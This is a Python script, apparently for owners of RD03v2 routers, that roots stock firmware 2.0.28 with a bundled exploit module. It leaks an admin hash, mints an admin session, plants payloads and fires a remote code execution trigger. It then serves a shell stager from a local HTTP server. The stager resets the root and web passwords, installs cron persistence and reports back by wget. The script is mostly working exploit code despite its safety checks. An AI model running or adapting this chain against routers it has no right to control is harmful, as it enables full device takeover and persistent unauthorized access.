"""RD03v2 helper for user-installed Python. Explicit operation required for router access."""
import argparse
import getpass
import hashlib
import http.server
import importlib.util
import ipaddress
import json
import pathlib
import re
import secrets
import shlex
import socket
import struct
import sys
import threading
import time
import urllib.parse
import urllib.request

HERE = pathlib.Path(__file__).resolve().parent
HOST = "192.168.31.1"
PORT = 8000
LOCAL_IP = None


def check_environment():
    if sys.version_info < (3, 10) or struct.calcsize("P") != 8:
        raise RuntimeError("Use 64-bit Python 3.10 or newer; Python 3.13 x64 is recommended.")
    try:
        from ssh2.session import Session
    except (ImportError, OSError) as error:
        raise RuntimeError(
            "SSH dependency unavailable for this Python: {}. "
            "Install it yourself with: python -m pip install --only-binary=:all: -r requirements.txt. "
            "If no Windows wheel is available, use Python 3.13 x64."
            .format(sys.executable)
        ) from error


def private_ipv4(value):
    try:
        address = ipaddress.IPv4Address(value)
    except ipaddress.AddressValueError:
        raise argparse.ArgumentTypeError("Use a numeric private IPv4 address.")
    if not any(address in ipaddress.ip_network(block) for block in
               ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")):
        raise argparse.ArgumentTypeError("Only private LAN IPv4 addresses are supported.")
    return str(address)


def load_tool(name):
    manifest = json.loads((HERE / "sources.json").read_text(encoding="utf-8"))
    path = HERE / (name + ".py")
    if hashlib.sha256(path.read_bytes()).hexdigest() != manifest["files"][path.name]:
        raise RuntimeError("Source hash mismatch: " + path.name)
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    module.log = lambda message: None
    return module


def read_info():
    with urllib.request.urlopen(
        "http://" + HOST + "/cgi-bin/luci/api/xqsystem/init_info", timeout=20
    ) as response:
        info = json.load(response)
    if not isinstance(info, dict) or info.get("code") != 0:
        raise RuntimeError("Router returned invalid device information.")
    if (info.get("hardware", "").upper(), info.get("romversion")) != ("RD03V2", "2.0.28"):
        raise RuntimeError("This helper only admits RD03v2 stock 2.0.28.")
    if not info.get("id"):
        raise RuntimeError("Router did not return a serial number; cannot identify this device.")
    return info


def show_device(info):
    print("Target: {} | {} | firmware {} | SN {}".format(
        HOST, info["hardware"], info["romversion"], info["id"]))


def check_same_device(original):
    current = read_info()
    if (current["id"], current.get("inited")) != (original["id"], original.get("inited")):
        raise RuntimeError("Target device or initialization state changed; stopped before writing.")


def source_address():
    route = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        if LOCAL_IP:
            route.bind((LOCAL_IP, 0))
        route.connect((HOST, 80))
        return private_ipv4(route.getsockname()[0])
    finally:
        route.close()


def password(prompt):
    first = getpass.getpass(prompt)
    if not 10 <= len(first) <= 63 or not first.isascii() or any(ord(c) < 33 for c in first):
        raise RuntimeError("Use 10-63 printable ASCII characters without spaces.")
    if first != getpass.getpass("Repeat: "):
        raise RuntimeError("Passwords differ.")
    return first


def stager(root_password, wifi_password, source_ip, token):
    # Do not save credentials on this computer. The PoC downloads /tmp/x on the router.
    template = """#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
[ "$(id -u)" = 0 ] || exit 1
(
  for i in 1 2 3 4 5; do
    sleep 6
    changed=0
    for s in $(uci show wireless | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
      e=$(uci -q get wireless.$s.encryption)
      case "$e" in
        *wget*|*tmp/x*|*sh\\ /*)
          uci -q set wireless.$s.encryption=psk2
          uci -q set wireless.$s.key=WIFI_PASSWORD
          changed=1
          ;;
      esac
    done
    [ "$changed" = 0 ] || { uci commit wireless; wifi reload; }
  done
  printf '%s\\n%s\\n' ROOT_PASSWORD ROOT_PASSWORD | passwd root || exit 4
  printf '%s\\n' ROOT_PASSWORD | lua -e 'local p=io.read("*l"); assert(require("xiaoqiang.util.XQSecureUtil").savePlaintextPwdEx("admin",p))' || exit 9
  mkdir -p /etc/crontabs/patches || exit 10
  cat > /etc/crontabs/patches/rd03v2-ssh.sh <<'RD03V2_SSH_PATCH'
KEEPALIVE_CONTENT
RD03V2_SSH_PATCH
  chmod 700 /etc/crontabs/patches/rd03v2-ssh.sh || exit 11
  [ -f /etc/crontabs/root ] || touch /etc/crontabs/root
  if ! grep -Fq '/etc/crontabs/patches/rd03v2-ssh.sh' /etc/crontabs/root; then
    printf '\\n* * * * * /etc/crontabs/patches/rd03v2-ssh.sh >/dev/null 2>&1\\n' >> /etc/crontabs/root || exit 12
  fi
  /etc/init.d/cron enable || exit 13
  /etc/init.d/cron restart || exit 14
  rm -f /tmp/rd03v2-ssh-ready
  /etc/crontabs/patches/rd03v2-ssh.sh || exit 15
  sync
  wget -q -O /dev/null 'http://SOURCE_IP:SERVER_PORT/done/TOKEN' 2>/dev/null
  rm -f /tmp/x
) >/tmp/offline-ssh.log 2>&1 </dev/null &
exit 0
"""
    values = {"WIFI_PASSWORD": shlex.quote(wifi_password),
              "ROOT_PASSWORD": shlex.quote(root_password),
              "SOURCE_IP": source_ip, "TOKEN": token,
              "SERVER_PORT": str(PORT),
              "KEEPALIVE_CONTENT": (HERE / "ssh_keepalive.sh").read_text(encoding="utf-8").rstrip()}
    return re.sub("WIFI_PASSWORD|ROOT_PASSWORD|SOURCE_IP|SERVER_PORT|TOKEN|KEEPALIVE_CONTENT",
                  lambda match: values[match.group(0)], template).encode("ascii")


def verify_ssh(root_password):
    from ssh2.session import Session
    connection = socket.create_connection((HOST, 22), timeout=4)
    session = Session()
    try:
        session.set_timeout(8000)
        session.handshake(connection)
        session.userauth_password("root", root_password)
        channel = session.open_session()
        channel.execute("id; if test -x /etc/crontabs/patches/rd03v2-ssh.sh "
                        "&& grep -Fq /etc/crontabs/patches/rd03v2-ssh.sh /etc/crontabs/root "
                        "&& /etc/init.d/cron enabled; then echo PERSISTENCE_FILES_OK; fi")
        data = b""
        while True:
            count, block = channel.read()
            if count == 0:
                break
            data += block
        channel.close()
        if b"uid=0(root)" not in data:
            raise RuntimeError("SSH authenticated, but root identity was not confirmed.")
        print(data.decode("utf-8", "replace").strip())
        return b"PERSISTENCE_FILES_OK" in data
    finally:
        try:
            session.disconnect()
        finally:
            connection.close()


def verify_web(web_password):
    with urllib.request.urlopen("http://" + HOST + "/cgi-bin/luci/web", timeout=20) as response:
        page = response.read().decode("utf-8", "replace")
    key = re.search(r"key:\s*'([^']+)'", page)
    mac = re.search(r"var deviceId\s*=\s*'([^']+)'", page)
    if not key or not mac:
        raise RuntimeError("Cannot read the stock web-login parameters.")
    nonce = "0_{}_{}_{}".format(mac.group(1), int(time.time()), secrets.randbelow(9000) + 1000)
    account = hashlib.sha256((web_password + key.group(1)).encode("utf-8")).hexdigest()
    digest = hashlib.sha256((nonce + account).encode("ascii")).hexdigest()
    body = urllib.parse.urlencode({"username": "admin", "password": digest,
                                  "logtype": "2", "nonce": nonce}).encode("ascii")
    with urllib.request.urlopen("http://" + HOST + "/cgi-bin/luci/api/xqsystem/login",
                                data=body, timeout=20) as response:
        result = json.load(response)
    return result.get("code") == 0 and bool(result.get("token"))


def status():
    info = read_info()
    show_device(info)
    print("Initialized:", info.get("inited"))
    for port in (22, 19553):
        try:
            with socket.create_connection((HOST, port), timeout=3):
                print("TCP {}: OPEN".format(port))
        except OSError:
            print("TCP {}: not accepting a connection".format(port))
    print("No password was requested and no configuration was changed.")


def enable():
    info = read_info()
    show_device(info)
    if info.get("inited") != 1:
        raise RuntimeError("Run --init first, after manually resetting the router.")
    source_ip = source_address()
    print("Payload listener address:", source_ip)
    tool = load_tool("ota_rce")
    verifier = tool.leak_admin_hash(HOST, 19553, b"sshsetup", 15)
    stok = tool.mint_admin(HOST, verifier, info.get("mac", "00:00:00:00:00:00"))
    try:
        tool.require_tested_gate_open_mode(tool.api(HOST, stok, "api/xqnetwork/get_netmode"))
    except ValueError as error:
        raise RuntimeError(str(error) + " This is a post-reset tool. Do not bypass this check.")
    print("Gate-open RD03v2 2.0.28 confirmed. No payload has been planted yet.")
    root_password = password("New SSH root AND router web-admin password: ")
    wifi_password = password("Temporary Wi-Fi password: ")
    print("This will set SSH/web-admin passwords, enable stock SSH, and repair Wi-Fi changes.")
    if input("Type ENABLE to proceed: ") != "ENABLE":
        return
    check_same_device(info)
    tool.require_tested_gate_open_mode(tool.api(HOST, stok, "api/xqnetwork/get_netmode"))
    token = secrets.token_hex(16)
    body = stager(root_password, wifi_password, source_ip, token)
    completed = threading.Event()

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def do_GET(self):
            if self.client_address[0] != HOST:
                self.send_error(403)
                return
            if self.path == "/s":
                content = body
            elif self.path == "/done/" + token:
                completed.set()
                content = b"ok"
            else:
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)

    server = http.server.HTTPServer((source_ip, PORT), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        print("Local payload server: {}:{}; planting and triggering once.".format(source_ip, PORT))
        tool.plant_payloads(HOST, stok, source_ip, PORT)
        tool.fire_trigger(HOST, 19553, b"sshsetup2", 15)
        print("Waiting for SSH. Keep Ethernet connected; do not reboot or rerun the trigger.")
        deadline = time.monotonic() + 180
        while time.monotonic() < deadline:
            try:
                persistent = verify_ssh(root_password)
            except Exception as error:
                last_error = error
                time.sleep(3)
                continue
            print("SUCCESS: root SSH login verified. Callback:", completed.is_set())
            print("Connect with: ssh root@" + HOST)
            if not persistent:
                raise RuntimeError("SSH works, but persistence files were not verified. Do not reboot or rerun the trigger.")
            if not verify_web(root_password):
                raise RuntimeError("SSH works, but the new web-admin password was not accepted. Do not rerun the trigger.")
            print("WEB_PASSWORD_OK: normal admin login accepted.")
            print("PERSISTENCE_FILES_OK: cron repair files verified. After reboot, wait up to 90 seconds.")
            print("Reboot persistence still needs to be checked on this individual router.")
            return
        raise RuntimeError("SSH was not verified. Do not blindly rerun. Last error: " + str(last_error))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def main():
    global HOST, PORT, LOCAL_IP
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", type=private_ipv4, default="192.168.31.1")
    parser.add_argument("--port", type=int, default=8000, help="Local temporary HTTP port")
    parser.add_argument("--local-ip", type=private_ipv4, help="Local Ethernet IPv4 if automatic selection is unsuitable")
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--init", action="store_true")
    mode.add_argument("--enable", action="store_true")
    mode.add_argument("--status", action="store_true", help="Read device identity and probe ports only")
    mode.add_argument("--verify", action="store_true", help="Verify existing SSH, persistence files and web password")
    args = parser.parse_args()
    if not 1024 <= args.port <= 65535:
        parser.error("--port must be between 1024 and 65535")
    HOST, PORT, LOCAL_IP = args.host, args.port, args.local_ip
    if not args.status:
        check_environment()
    urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler({})))
    if args.init:
        info = read_info()
        show_device(info)
        if info.get("inited") != 0:
            raise RuntimeError("Router is already initialized. No settings were changed.")
        if input("After MANUAL factory reset, type INIT to minimally initialize and reboot: ") != "INIT":
            return
        check_same_device(info)
        tool = load_tool("init_router")
        sys.argv = ["init_router.py", "--host", HOST, "--reboot"]
        if tool.main() != 0:
            raise RuntimeError("Minimal initialization did not complete.")
        info = read_info()
        if info.get("inited") != 1:
            raise RuntimeError("Initialization was not confirmed; do not run --enable yet.")
        print("Initialization complete. Next run --enable.")
    elif args.enable:
        enable()
    elif args.status:
        status()
    elif args.verify:
        info = read_info()
        show_device(info)
        value = getpass.getpass("Current SSH root password: ")
        persistent = verify_ssh(value)
        if not persistent:
            raise RuntimeError("SSH works, but persistence files are missing or cron is not enabled.")
        if input("Use the same password to check web admin? [Y/n]: ").strip().lower() == "n":
            value = getpass.getpass("Current web-admin password: ")
        if not verify_web(value):
            raise RuntimeError("SSH works, but the supplied web-admin password was not accepted.")
        print("VERIFY_OK: root SSH, web password and persistence files confirmed.")
    else:
        for name in ("init_router", "ota_rce"):
            load_tool(name)
        stager("LocalCheckRoot123", "LocalCheckWifi123", "192.168.31.2", "local-check-only")
        print("Offline dependencies and source hashes OK. No router requests were sent.")
        print("No option: local checks only. --status/--verify read the device; --init/--enable modify it.")
        print("Factory reset is never automatic.")


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print("STOP:", error)
        sys.exit(1)
